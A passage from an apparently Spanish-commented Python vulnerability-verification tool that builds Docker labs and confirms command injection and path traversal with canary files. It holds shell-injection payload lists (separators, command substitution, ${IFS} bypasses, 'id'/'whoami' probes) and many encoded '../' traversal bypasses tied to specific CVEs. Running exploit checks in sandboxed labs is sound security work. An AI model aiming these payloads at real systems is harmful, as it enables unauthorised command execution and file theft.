        ip = (r.stdout or "").strip()
        return ip or None

    def teardown(self):
        for kind, name in reversed(self._created):
            try:
                if kind == "container":
                    self.sh("rm", "-f", name, timeout=30)
                elif kind == "image":
                    self.sh("rmi", "-f", name, timeout=30)
                elif kind == "network":
                    self.sh("network", "rm", name, timeout=15)
                elif kind == "compose":
                    subprocess.run(["docker", "compose", "-f", name, "-p", self.compose_project,
                                    "down", "-v"], capture_output=True, timeout=60)
            except Exception:
                pass


def _scan_web_routes(source_dir: str) -> list:
    """Scan source dir for HTTP endpoints and their parameters.

    Reads Python (Flask/Django) and Ruby (Sinatra/Rack) files in source_dir
    and extracts route definitions + parameter names. Returns list of
    (endpoint_path, params_dict, http_method) sorted by specificity.

    Used as a pre-flight in verify_generic_ssti so the verifier tries
    the ACTUAL routes before falling back to the LLM-guessed endpoint.
    This is the binoracle autonomy gap fix: the LLM hypothesis is seeded
    from the CVE description (which doesn't mention specific lab routes),
    but the source code *does* -- scanning it removes the dependence on
    the LLM guessing the right endpoint.
    """
    import glob as _glob
    routes: list = []
    if not source_dir or not os.path.isdir(source_dir):
        return routes

    # --- Flask (Python) ---
    for py_file in _glob.glob(os.path.join(source_dir, "**", "*.py"), recursive=True):
        try:
            lines = open(py_file).readlines()
        except Exception:
            continue
        cur_ep: Optional[str] = None
        cur_meth = "GET"
        cur_params: dict = {}
        for line in lines:
            s = line.strip()
            # @app.route("/path") or @bp.route("/path", methods=["POST"])
            m_route = re.match(
                r'@\w+\.route\(["\']([^"\']+)["\'](?:[^)]*methods\s*=\s*\[([^\]]+)\])?', s)
            if m_route:
                if cur_ep is not None:
                    routes.append((cur_ep, dict(cur_params), cur_meth))
                cur_ep = m_route.group(1)
                methstr = m_route.group(2) or ""
                meths = [x.strip().strip('"\'').upper()
                         for x in methstr.split(",") if x.strip().strip('"\'')]
                cur_meth = meths[0] if meths else "GET"
                cur_params = {}
            elif cur_ep is not None:
                for pm in re.finditer(
                        r'request\.(?:args|values)\.get\(["\']([^"\']+)["\']', s):
                    cur_params[pm.group(1)] = ""
                for pm in re.finditer(
                        r'request\.form\.get\(["\']([^"\']+)["\']', s):
                    cur_params[pm.group(1)] = ""
                    cur_meth = "POST"
                # Detect render_template / render_template_string calls: marks render endpoints
                if re.search(r'render_template\s*\(', s):
                    cur_params["__RENDERS_TEMPLATE__"] = "1"
        if cur_ep is not None:
            routes.append((cur_ep, dict(cur_params), cur_meth))

    # --- aiohttp (Python): add_static('/prefix', root, follow_symlinks=...) ---
    # Confirmado en vivo con CVE-2024-23334: el LLM propone endpoint '/static/<path:path>'
    # (con sintaxis de plantilla) que no se detecta como URL_PATH y falla la URL construction.
    # Escaneando add_static() directamente se obtiene el prefijo limpio '/static/' como URL_PATH.
    for py_file in _glob.glob(os.path.join(source_dir, "**", "*.py"), recursive=True):
        try:
            content = open(py_file).read()
        except Exception:
            continue
        for m_as in re.finditer(
            r'(?:app|router)(?:\.router)?\.add_static\s*\(\s*["\']([^"\']+)["\']',
            content
        ):
            prefix = m_as.group(1).rstrip("/") + "/"
            routes.append((prefix, {"URL_PATH": ""}, "GET"))

    # --- Sinatra / plain Rack (Ruby) --- includes config.ru (*.ru) and *.rb
    _rb_files = (_glob.glob(os.path.join(source_dir, "**", "*.rb"), recursive=True) +
                 _glob.glob(os.path.join(source_dir, "**", "*.ru"), recursive=True))
    for rb_file in _rb_files:
        try:
            lines = open(rb_file).readlines()
        except Exception:
            continue
        full_rb = "".join(lines)
        # Rack::Static (multi-line): use Rack::Static, ... urls: [...] ...
        # Uses full-file scan because the declaration spans several lines.
        # Strategy: find each `Rack::Static` occurrence and extract the NEXT 400 chars as block.
        for m_static_pos in [m.start() for m in re.finditer(r'Rack::Static', full_rb)]:
            block = full_rb[m_static_pos:m_static_pos + 400]
            m_urls = re.search(r'urls\s*:\s*\[([^\]]+)\]', block, re.DOTALL)
            if not m_urls:
                continue
            # Extract root: (optional, for prefix-bypass canary planting)
            rack_root = ""
            m_root_str = re.search(r'root\s*:\s*["\']([^"\']+)["\']', block)
            m_root_dir = re.search(r'root\s*:\s*__dir__', block)
            m_root_join = re.search(
                r'root\s*:\s*File\.join\(__dir__\s*,\s*["\']([^"\']+)["\']', block)
            if m_root_str:
                rack_root = m_root_str.group(1)
            elif m_root_dir:
                # root: __dir__ → el root es el propio WORKDIR del contenedor
                rack_root = "WORKDIR/"
            elif m_root_join:
                rack_root = "WORKDIR/" + m_root_join.group(1)
            urls_str = m_urls.group(1)
            for pu in re.finditer(r'["\']([^"\']+)["\']', urls_str):
                prefix = pu.group(1).rstrip("/") + "/"
                params: dict = {"URL_PATH": ""}
                if rack_root:
                    params["RACK_STATIC_ROOT"] = rack_root
                routes.append((prefix, params, "GET"))
        for line in lines:
            s = line.strip()
            # get '/path' do ... or post '/path' do ...
            m_rb = re.match(r'(get|post|put|patch|delete)\s+["\']([^"\']+)["\']', s)
            if m_rb:
                routes.append((m_rb.group(2), {}, m_rb.group(1).upper()))

    # --- Node.js plain-http / Express (server.js) ---
    # Detecta patrones como: req.url.startsWith('/cmd') o app.get('/cmd', ...)
    for js_file in _glob.glob(os.path.join(source_dir, "**", "*.js"), recursive=True):
        try:
            content = open(js_file).read()
        except Exception:
            continue
        # req.url.startsWith('/path')
        for m_node in re.finditer(r'req\.url\.startsWith\(["\']([^"\']+)["\']', content):
            ep = m_node.group(1)
            # Busca el parametro en url.parse(...).query[...] en el contexto circundante
            ctx = content[max(0, m_node.start() - 50):m_node.start() + 300]
            params: dict = {}
            for pm in re.finditer(r'q\[["\']([^"\']+)["\']', ctx):
                params[pm.group(1)] = ""
            routes.append((ep, params, "GET"))
        # Express: app.get('/path', ...) / router.post('/path', ...)
        for m_exp in re.finditer(
                r'(?:app|router)\.(get|post|put|patch|delete)\s*\(\s*["\']([^"\']+)["\']',
                content):
            meth = m_exp.group(1).upper()
            ep = m_exp.group(2)
            routes.append((ep, {}, meth))

    # Deduplicate while preserving order
    seen: set = set()
    uniq = []
    for r in routes:
        key = (r[0], r[2])
        if key not in seen:
            seen.add(key)
            uniq.append(r)
    return uniq


def _diagnose_infra_error(e: Exception, source_dir: str = "", base_url: str = "") -> str:
    """Razona el error de infraestructura y devuelve un mensaje de diagnostico especifico.
    Convierte errores genericos ('timeout', 'connection refused', etc.) en explicaciones
    utiles con causas y sugerencias de accion."""
    import subprocess as _sp
    msg = str(e)
    is_next = "next_autonomous" in source_dir or "next" in source_dir.lower()
    is_timeout = isinstance(e, (_sp.TimeoutExpired,)) or "timeout" in msg.lower() or "timed out" in msg.lower()

    if is_timeout:
        if is_next:
            return (
                "timeout de arranque del lab Next.js -- Next.js 15.x en dev mode tarda "
                "60-120s en compilar la primera peticion. El contenedor arranco pero la "
                "app aun no estaba lista. Reintenta con --no-cache para un lab limpio"
            )
        return (
            f"timeout de infraestructura: el laboratorio no respondio a tiempo -- "
            f"puede que Docker tardara en construir la imagen o el servidor necesite "
            f"mas tiempo de arranque. Reintenta con --no-cache. Detalle: {e}"
        )
    if "connection refused" in msg.lower() or "connectionrefused" in msg.lower():
        return (
            f"conexion rechazada{(' en ' + base_url) if base_url else ''} -- "
            f"el servidor arranco pero cerro el puerto o no llego a escuchar. "
            f"Revisa los logs del contenedor con: docker logs <contenedor>"
        )
    if "docker" in msg.lower() and ("not found" in msg.lower() or "daemon" in msg.lower()):
        return (
            "Docker no esta corriendo o no esta en el PATH -- "
            "arranca Docker Desktop (Mac/Windows) o 'sudo systemctl start docker' (Linux) "
            f"y vuelve a intentarlo. Detalle: {e}"
        )
    if "no space left" in msg.lower():
        return (
            "sin espacio en disco -- Docker no puede construir la imagen del lab. "
            "Libera espacio con: docker system prune -f"
        )
    if "permission denied" in msg.lower():
        return (
            f"permiso denegado -- puede que Docker necesite sudo o que el usuario "
            f"no este en el grupo 'docker'. Detalle: {e}"
        )
    # Generico pero con el mensaje completo para diagnostico
    return f"error inesperado: {e}"


def _bootstrap_generic_lab(source_dir: str, step, res: WpVerifyResult,
                           budget_s: float, setup_commands: Optional[List[str]] = None,
                           dockerfile_body: str = "",
                           extra_files: Optional[dict] = None,
                           prebuilt_url: str = "") -> Optional[tuple]:
    """Pasos comunes a TODOS los verificadores genericos: detectar como arrancar el objetivo,
    construirlo/arrancarlo, y encontrar por donde habla HTTP. Devuelve (lab, base_url, container)
    o None con `res` ya relleno (detail/logs/limitations) -- el caller solo tiene que `return res`.

    `setup_commands` (opcional): comandos de shell reales, ejecutados via `docker exec` DENTRO del
    contenedor ya arriba, DESPUES de confirmar que responde HTTP pero ANTES de lanzar cualquier
    ataque -- analogo generico del `extra_setup_script` que drupalverify.py ya tiene para Views
    que necesitan contenido real. Confirmado como necesario en vivo contra CVE-2026-65694
    (Microweber): el framework (Laravel) responde HTTP 200 en CUALQUIER ruta mientras la app no
    esta instalada (migraciones/base de datos), incluida la propia ruta vulnerable -- sin esto,
    cualquier generico que arranque el objetivo con `docker compose up` a secas prueba contra una
    app a medio arrancar y nunca llega al codigo real, sea o no vulnerable (falso negativo por
    entorno, no por el payload). Si CUALQUIER comando falla, se aborta con el detalle real en vez
    de seguir probando contra un objetivo que sabemos a medias.

    `dockerfile_body` (opcional): si se proporciona, se usa DIRECTAMENTE como Dockerfile para
    construir el lab -- tiene prioridad absoluta sobre cualquier Dockerfile/docker-compose.yml
    que el repo descargado pudiera traer (resuelve el caso Gradio donde el repo tiene su propio
    test/test_docker/docker-compose.yml que falla al construir fuera del entorno de desarrollo).

    `extra_files` (opcional): diccionario {nombre_fichero: contenido} que se escribe en el
    directorio de contexto Docker ANTES de construir -- necesario para COPY app.py etc."""
    # Lab ya corriendo externamente (--target-url) — saltar Docker por completo
    if prebuilt_url:
        step(f"usando target externo pre-arrancado: {prebuilt_url} (sin Docker)")
        res.evidence["prebuilt_target"] = prebuilt_url
        return (None, prebuilt_url.rstrip("/"), "prebuilt")

    if dockerfile_body:
        # Analyst-provided Dockerfile takes priority over anything in source_dir
        import tempfile
        ctx_dir = tempfile.mkdtemp(prefix="binoracle_analyst_ctx_")
        df_path = os.path.join(ctx_dir, "Dockerfile")
        with open(df_path, "w") as f:
            f.write(dockerfile_body)
        for fname, content in (extra_files or {}).items():
            fp = os.path.join(ctx_dir, os.path.basename(fname))
            with open(fp, "w") as f:
                f.write(content)
        target = {"kind": "dockerfile", "path": df_path, "context": ctx_dir,
                  "_analyst_ctx": ctx_dir}
        step("usando Dockerfile del analista (prioridad sobre repo)")
    else:
        target = _find_build_target(source_dir)
    if target is None:
        res.detail = ("no se encontro Dockerfile ni docker-compose.yml en el codigo descargado, "
                      "y el stack tampoco se reconocio por sus ficheros propios (package.json/"
                      "requirements.txt/composer.json/*.php)")
        res.limitations.append("la verificacion generica SOLO puede montar un objetivo que "
                               "traiga su propio Dockerfile/docker-compose.yml, o cuyo stack se "
                               "reconozca por sus ficheros propios (Node/Python/PHP) -- fuera de "
                               "eso no hay forma de arrancarlo sin adivinar a ciegas")
        return None
    if target.get("auto_generado"):
        step(f"objetivo generico SIN Dockerfile/compose propio -- stack detectado por "
             f"'{target['stack_detectado']}', generando un Dockerfile minimo propio para "
             f"arrancarlo (NO es el del autor del PoC)...")
        res.evidence["dockerfile_auto_generado"] = True
        res.evidence["stack_detectado"] = target["stack_detectado"]
        res.limitations.append(
            f"el objetivo no traia su propio Dockerfile/docker-compose.yml -- se genero uno "
            f"MINIMO propio a partir del stack detectado ('{target['stack_detectado']}'), "
            f"acotado a Node/Python/PHP sin framework; si el proyecto real necesita variables de "
            f"entorno, servicios auxiliares (base de datos, cache) o un arranque distinto, puede "
            f"no levantar correctamente -- revisa los logs si el objetivo no responde")
    else:
        step(f"objetivo generico detectado: {target['kind']} en {target['path']}")

    lab = _GenericLab(_token())
    step("construyendo y arrancando el objetivo (docker build/compose, puede tardar)...")
    r = lab.build_and_run(target)
    if r.returncode != 0:
        res.detail = f"fallo al construir/arrancar el objetivo: {(r.stderr or r.stdout or '')[:2000]}"
        lab.teardown()
        return None

    _cms_hint = target.get("cms")
    step(f"esperando a que el objetivo responda HTTP{' (CMS: ' + _cms_hint + ')' if _cms_hint else ''}...")
    found_http = lab.discover_http(cms=_cms_hint)
    if found_http is None:
        res.detail = "el objetivo arranco pero ningun puerto publicado respondio HTTP a tiempo"
        for c in lab.running_containers():
            res.logs.append(f"docker logs ({c}):\n" + lab.logs_tail(c))
        lab.teardown()
        return None
    container, port = found_http
    base_url = f"http://{_lab_host()}:{port}"
    step(f"objetivo arriba: {base_url} (contenedor '{container}')")

    for cmd in (setup_commands or []):
        step(f"ejecutando paso de configuracion real dentro del contenedor: {cmd!r}...")
        r = lab.sh("exec", container, "sh", "-c", cmd, timeout=180)
        if r.returncode != 0:
            res.detail = (f"el paso de configuracion {cmd!r} fallo (codigo {r.returncode}): "
                          f"{(r.stderr or r.stdout or '')[-500:]}")
            res.logs.append(f"setup_commands[{cmd!r}] stdout/stderr:\n"
                            f"{(r.stdout or '')}\n{(r.stderr or '')}")
            lab.teardown()
            return None

    return (lab, base_url, container)


def verify_generic_command_injection(
    source_dir: str, endpoint: str, http_method: str, parameters,
    cmd_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0, custom_headers: Optional[dict] = None,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Verifica OS command injection contra CUALQUIER objetivo que traiga su propio Dockerfile/
    docker-compose.yml, sin asumir el stack (Python/Node/Go/PHP/Java/Ruby... todos escriben a
    disco igual, asi que el canario de fichero via `docker exec` sirve siempre). No hay login de
    por medio -- esta clase, a diferencia de missing-authorization o account-takeover, no lo
    necesita para probarse."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        secret = _token() * 4
        canary_path = f"/tmp/binoracle_ci_{_token()}.txt"
        m = (http_method or "POST").upper().split("/")[0].split("|")[0].strip() or "POST"
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": endpoint,
                             "metodo": m, "canary_path": canary_path, "canary_secret": secret})
        # Captura: servidor arrancado, antes del ataque
        try:
            _shot_srv = _screenshot_terminal_step(
                "Servidor levantado — antes del ataque",
                f"Contenedor : {container}\nURL        : {base_url}\nMétodo     : {m}\nEndpoint   : {endpoint}")
            if _shot_srv:
                res.evidence.setdefault("screenshots", []).append(
                    {"png_b64": _shot_srv, "caption_es": "Servidor levantado antes del ataque",
                     "caption_en": "Server up before attack", "url": base_url})
        except Exception:
            pass

        # separadores reales de command injection (sh/bash/dash/ash) -- casuistica de
        # Command Injection/Intruder/command_exec.txt en PayloadsAllTheThings: los separadores
        # estandar (; | || && salto de linea), sustitucion de comandos (funciona aunque el valor
        # ya este entre comillas/concatenado), rotura de contexto de comillas, y bypass de
        # filtro de espacios via ${IFS}/%09 (comun cuando el codigo bloquea el caracter espacio
        # pero no el separador de comando).
        payload_forms = [
            f"; echo {secret} > {canary_path}",
            f"| echo {secret} > {canary_path}",
            f"|| echo {secret} > {canary_path}",
            f"&& echo {secret} > {canary_path}",
            f"\necho {secret} > {canary_path}\n",
            f"`echo {secret} > {canary_path}`",
            f"$(echo {secret} > {canary_path})",
            f"' ; echo {secret} > {canary_path} ; '",
            f'" ; echo {secret} > {canary_path} ; "',
            f";echo${{IFS}}{secret}>{canary_path}",
            f";echo%09{secret}>{canary_path}",
        ]
        # ademas de las anteriores, los separadores PUROS (sin comando incrustado, ver
        # payload_kb.load_command_injection_separators) de command_exec.txt que todavia no estan
        # arriba -- & solo y %0a%0d (CRLF).
        for sep in load_command_injection_separators():
            if sep in ("&", "%0a%0d"):
                payload_forms.append(f"{sep} echo {secret} > {canary_path}")
        candidate_params = [cmd_param_hint] if cmd_param_hint else (
            list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or []))
        if not candidate_params:
            candidate_params = [_pick_param(parameters, _CI_HINTS) or "input"]

        tried = []
        found = False
        first_resp_captured = False
        for pname in candidate_params:
            if found:
                break
            for form in payload_forms:
                payload = dict(parameters) if isinstance(parameters, dict) else {}
                payload[pname] = form
                try:
                    resp = _http_request(m, base_url + endpoint, timeout=15,
                                     data=payload if m != "GET" else None,
                                     params=payload if m == "GET" else None,
                                     headers=custom_headers or None)
                except Exception as e:
                    tried.append({"parametro": pname, "error": str(e)})
                    continue
                if not first_resp_captured:
                    # recorte del primer intento -- la evidencia que lee el bucle de aprendizaje-
                    # y-reintento del LLM para decidir si el endpoint/parametro probados son
                    # correctos (p.ej. un 404 de la propia app apuntaria a lo contrario).
                    res.evidence["respuesta_cuerpo_recorte"] = (getattr(resp, "text", "") or "")[:500]
                    first_resp_captured = True
                time.sleep(1)
                content = lab.read_file(container, canary_path)
                present = secret in content
                tried.append({"parametro": pname, "payload": form, "secreto_presente": present})
                if present:
                    found = True
                    res.evidence["parametro_ganador"] = pname
                    res.evidence["payload_ganador"] = form
                    step(f"VERIFICADO: {canary_path} dentro del contenedor contiene el secreto "
                         f"exacto tras inyectar via '{pname}' -- el comando se ejecuto de verdad.")
                    break

        res.evidence["intentos"] = tried
        if found:
            # ── Impact proof: run `id` and `whoami` via the same injection ──
            _id_output = ""
            _whoami_output = ""
            _pname_win = res.evidence.get("parametro_ganador", "")
            _form_win  = res.evidence.get("payload_ganador", "")
            _sep = ""
            # Extract the separator from the winning payload (;, |, &&, \n, $())
            for _s in ("; ", "| ", "|| ", "&& ", "\n", "`", "$("):
                if _form_win.startswith(_s.strip()) or f"{_s}" in _form_win:
                    _sep = _s.rstrip(); break
            if not _sep:
                _sep = ";"
            try:
                _id_path = f"/tmp/binoracle_id_{_token()}.txt"
                _who_path = f"/tmp/binoracle_who_{_token()}.txt"
                _id_payload = dict(parameters) if isinstance(parameters, dict) else {}
                _id_payload[_pname_win] = f"{_sep} id > {_id_path}"
                _http_request(m, base_url + endpoint, timeout=10,
                              data=_id_payload if m != "GET" else None,
                              params=_id_payload if m == "GET" else None,
                              headers=custom_headers or None)
                time.sleep(1)
                _id_output = lab.read_file(container, _id_path).strip()

                _who_payload = dict(parameters) if isinstance(parameters, dict) else {}
                _who_payload[_pname_win] = f"{_sep} whoami > {_who_path}"
                _http_request(m, base_url + endpoint, timeout=10,
                              data=_who_payload if m != "GET" else None,
                              params=_who_payload if m == "GET" else None,
                              headers=custom_headers or None)
                time.sleep(1)
                _whoami_output = lab.read_file(container, _who_path).strip()
            except Exception:
                pass
            res.evidence["rce_id_output"]     = _id_output
            res.evidence["rce_whoami_output"] = _whoami_output
            # ──────────────────────────────────────────────────────────────

            res.verified = True
            res.ok = True
            res.detail = (f"COMMAND INJECTION confirmada: el payload en el parametro "
                          f"'{res.evidence['parametro_ganador']}' hizo que {canary_path} "
                          f"apareciera DENTRO del contenedor con el secreto exacto -- prueba "
                          f"inequivoca de ejecucion de comandos, no una deduccion por status code"
                          + (f"; id={_id_output!r}" if _id_output else ""))
            _ci_url = base_url + endpoint
            _ci_body = (f"COMMAND INJECTION — IMPACTO REAL CONFIRMADO\n\n"
                        f"{'─'*52}\n"
                        f"Parametro    : {res.evidence.get('parametro_ganador','')}\n"
                        f"Payload      : {res.evidence.get('payload_ganador','')}\n"
                        f"Canario      : {canary_path} → '{secret}'\n\n"
                        + (f"$ id\n{_id_output}\n" if _id_output else "")
                        + (f"$ whoami\n{_whoami_output}\n" if _whoami_output else "")
                        + f"\nRespuesta HTTP (primer intento):\n"
                        f"{res.evidence.get('respuesta_cuerpo_recorte','')[:300]}")
            _highlight_ci = _id_output or _whoami_output or secret
            _add_exploit_evidence(
                res=res, method=m, url=_ci_url,
                resp_or_body=_ci_body,
                highlight=_highlight_ci,
                caption_es=(f"COMMAND INJECTION confirmada: payload en '{res.evidence.get('parametro_ganador','')}' "
                            f"ejecuto comando en el servidor — id={_id_output!r if _id_output else '(ver canario)'}"),
                caption_en=(f"COMMAND INJECTION confirmed: payload in '{res.evidence.get('parametro_ganador','')}' "
                            f"executed server command — id={_id_output!r if _id_output else '(see canary)'}"),
                extra_terminal=_ci_body,
            )
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried)} combinaciones de parametro/forma de "
                          f"inyeccion contra {endpoint} pero ninguna hizo aparecer el canario -- "
                          f"no se confirmo command injection (puede que el endpoint/parametro no "
                          f"sean los reales, o que la entrada no llegue a una shell sin filtrar)")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        lab.teardown()


def verify_generic_path_traversal(
    source_dir: str, endpoint: str, http_method: str, parameters,
    path_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0, setup_commands: Optional[List[str]] = None,
    url_suffix: str = "", custom_headers: Optional[dict] = None,
    query_suffix: str = "",
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_path_traversal (wpverify.py): planta un fichero
    canario con un secreto aleatorio DENTRO del contenedor real del objetivo (via `docker exec`,
    fuera de cualquier directorio de la app) y prueba las mismas variantes de profundidad/
    codificacion de '../' -- el mecanismo de prueba (leer un fichero del propio sistema de
    ficheros del contenedor) no depende del stack, asi que vale igual aqui que en WordPress.

    Comportamiento de descubrimiento autonomo: igual que verify_generic_ssti, escanea el codigo
    fuente en source_dir para descubrir endpoints reales (Rack::Static, Sinatra, Flask) ANTES
    de usar el endpoint que propuso el LLM. Esto resuelve el caso Rack::Static (CVE-2025-27610)
    donde el endpoint /static/ no aparece en la descripcion NVD y el LLM adivina /cgi-bin/.

    `setup_commands` (opcional, ver _bootstrap_generic_lab): comandos reales ejecutados dentro
    del contenedor DESPUES de arrancar y ANTES de atacar -- necesario para frameworks (Laravel/
    Microweber confirmado en vivo con CVE-2026-65694) que exigen una instalacion/migracion real
    antes de que sus rutas se comporten como en produccion.

    `query_suffix` (opcional): cadena de query string que se añade a TODAS las peticiones
    URL_PATH, e.g. 'import&' para CVE-2025-30208 Vite donde '?import&' bypasea el allow-list
    de @fs. Se concatena como '?{query_suffix}' si no incluye '?', o directo si ya lo lleva."""
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    # --- Descubrimiento autonomo de rutas desde el codigo fuente ---
    scanned = _scan_web_routes(source_dir) if source_dir else []
    if scanned:
        step(f"escaneo de fuente: {len(scanned)} ruta(s) encontrada(s): " +
             ", ".join(ep for ep, _, _ in scanned))

    def _is_url_path_mode(params) -> bool:
        return ((path_param_hint or "").upper() in ("URL_PATH", "URLPATH") or
                (isinstance(params, dict) and any(k.upper() in ("URL_PATH", "URLPATH") for k in params)) or
                (isinstance(params, (list, tuple)) and any(str(p).upper() in ("URL_PATH", "URLPATH") for p in params)))

    # Normalizar endpoint: strip sintaxis de plantilla de ruta (Flask/aiohttp).
    # Confirmado en vivo con CVE-2024-23334: LLM propone '/static/<path:path>'.
    # '<path:path>' no es parte de la URL real -- hay que eliminarlo Y activar URL_PATH mode.
    if endpoint and '<' in endpoint:
        # Recorta desde el primer '<': '/static/<path:path>' -> '/static/'
        endpoint = re.sub(r'/<[^>]+>.*', '/', endpoint)
        if not endpoint.endswith('/'):
            endpoint = endpoint.rstrip('/') + '/'
        _url_path_mode_from_template = True
    else:
        _url_path_mode_from_template = False

    path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
    _url_path_mode = _is_url_path_mode(parameters) or _url_path_mode_from_template

    # Gap real (confirmado con CVE-2024-23334 / aiohttp): muchos path-traversal inyectan el
    # payload en el PATH de la URL, no en un query-param -- e.g. GET /static/../../etc/passwd.
    # El LLM puede indicarlo con path_param_hint="URL_PATH" (o pasando "url_path" como parametro).
    # Cuando el modo es URL_PATH el payload se concatena al endpoint en vez de enviarse como ?k=v.
    if not path_param and not _url_path_mode:
        # ultimo intento: si el endpoint ya termina en '/' es probable que espere el path a
        # continuacion (p.ej. /static/ -> /static/../../../../etc/passwd) -- modo URL_PATH.
        if endpoint and endpoint.endswith("/"):
            _url_path_mode = True
        elif not scanned:
            res.detail = "no se identifico el parametro que lleva la ruta/fichero objetivo"
            res.limitations.append("la verificacion de path-traversal necesita saber que parametro "
                                   "lleva la ruta/nombre de fichero; afina 'parameters' o pasalo a "
                                   "mano (path_param_hint) o usa path_param_hint='URL_PATH' si el "
                                   "payload va en el path de la URL (e.g. GET /files/../../etc/passwd)")
            return res

    # Construir lista ordenada de candidatos: rutas del escaneo primero, luego LLM
    # Cada candidato: (endpoint, params, method, url_path_mode)
    candidates: list = []
    seen_cands: set = set()
    for s_ep, s_params, s_meth in scanned:
        s_up = _is_url_path_mode(s_params) or s_ep.endswith("/")
        key = (s_ep, s_meth.upper())
        if key not in seen_cands:
            seen_cands.add(key)
            candidates.append((s_ep, s_params, s_meth.upper(), s_up, True))
    # LLM-guessed endpoint as fallback
    llm_up = _url_path_mode or (endpoint and endpoint.endswith("/"))
    llm_key = (endpoint or "/", (http_method or "GET").upper())
    if llm_key not in seen_cands and endpoint:
        candidates.append((endpoint, parameters, (http_method or "GET").upper(), llm_up, False))
    if not candidates:
        candidates.append((endpoint or "/", parameters, (http_method or "GET").upper(), llm_up, False))

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s, setup_commands=setup_commands,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        secret = _token() * 4
        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
        # Captura: servidor arrancado, antes del ataque
        try:
            _shot_srv = _screenshot_terminal_step(
                "Servidor levantado — antes del ataque",
                f"Contenedor : {container}\nURL        : {base_url}\nCanario    : {canary_path}")
            if _shot_srv:
                res.evidence.setdefault("screenshots", []).append(
                    {"png_b64": _shot_srv, "caption_es": "Servidor levantado antes del ataque",
                     "caption_en": "Server up before attack", "url": base_url})
        except Exception:
            pass
        step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
             f"propio contenedor del objetivo)...")
        if not lab.write_canary(container, canary_path, secret):
            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
            return res

        rel = canary_path.lstrip("/")
        depths = (2, 4, 6, 8, 10, 12)
        attempts = [rel, canary_path]
        attempts += [("../" * n) + rel for n in depths]
        attempts += [("..%2f" * n) + rel for n in depths]
        attempts += [("%2e%2e%2f" * n) + rel for n in depths]
        attempts += [("%252e%252e%252f" * n) + rel for n in depths]
        attempts += [("..\\" * n) + rel for n in depths]
        attempts += [("....//" * n) + rel for n in depths]
        # Codificacion '%2e%2e/' (puntos codificados + slash LITERAL): bypass especifico de h3/FastURL
        # (CVE-2026-86253). h3 llama decodeURI(pathname) que convierte %2e → . pero NO %2f → /.
        # Con slash literal entre los segmentos, decodeURI devuelve '../../...' que path.join
        # resuelve como traversal. Los patrones ..%2f o %2e%2e%2f NO funcionan porque %2f no
        # lo decodifica decodeURI. _http_request_raw_path preserva el %2e para que requests
        # no normalice el path antes de enviarlo.
        attempts += [("%2e%2e/" * n) + rel for n in depths]
        # Codificacion '.%2e/' (punto + slash codificado): bypass especifico de CVE-2021-41773
        # (Apache httpd 2.4.49) donde el normalizador de rutas no desnormalizaba esta secuencia.
        # Ninguna de las variantes estandar de arriba la cubre (confirmado en vivo: ..%2f y
        # %2e%2e%2f no funcionan contra Apache 2.4.49; solo .%2e/ funciona).
        attempts += [(".%2e/" * n) + rel for n in depths]
        # Codificacion '%2F..%2F' (slash codificado ANTES de los puntos): bypass confirmado en
        # CVE-2026-71209 (audiobookshelf) donde el check de autenticacion exime rutas que empiezan
        # con /items/ o /authors/ y no normaliza %2F antes de comparar -- el slash inicial hace
        # que el item ID empiece con '/', rompiendo la resolucion de ruta esperada.
        # IMPORTANTE: se codifican TODOS los slashes de rel (no solo los de traversal) para que el
        # url_suffix se pueda seguir usando sin que un '/' intermedio parta el parametro de ruta.
        # Ej: rel="tmp/canary.txt", url_suffix="/cover" →
        #   "%2F..%2F..%2Ftmp%2Fcanary.txt" + "/cover"   ← correcto
        #   "%2F..%2F..%2Ftmp/canary.txt"   + "/cover"   ← ROTO (Express ve :id="%2F..%2F..%2Ftmp")
        _rel_2f = rel.replace("/", "%2F")
        attempts += [("%2F.." * n) + "%2F" + _rel_2f for n in depths]
        # Double-slash bypass: '//' + abs_path bypasea checks de tipo
        # allowed_path.startswith(user_path) que no normalizan slashes multiples antes de comparar
        # (CVE-2024-1561 Gradio: /file=//etc/passwd; otros frameworks Python/Ruby/Go similares).
        attempts += ["//" + canary_path, "/" + canary_path, "//" + rel, "/" + rel]
        # Backslash-encoded bypass '%5C..%5C': en sistemas POSIX el sanitizador trata '\' como byte
        # ordinario de nombre de fichero y no lo bloquea; pero si la app convierte '\' → '/' DESPUÉS
        # del check (CVE-2026-114516 Etherpad Minify.ts), los '%5C..%5C' se convierten en '/../'
        # y producen traversal sin haber pasado por el filtro.  El canary se referencia también con
        # '%5C' en lugar de '/' para que el path quede totalmente codificado en backslash.
        _rel_bs = rel.replace("/", "%5C")
        attempts += [("%5C.." * n) + "%5C" + _rel_bs for n in depths]
        attempts += [rel + "%00", canary_path + "%00"]

        found = False
        tried_all: list = []
        win_ep = endpoint or "/"
        win_up = _url_path_mode
        win_pp = path_param

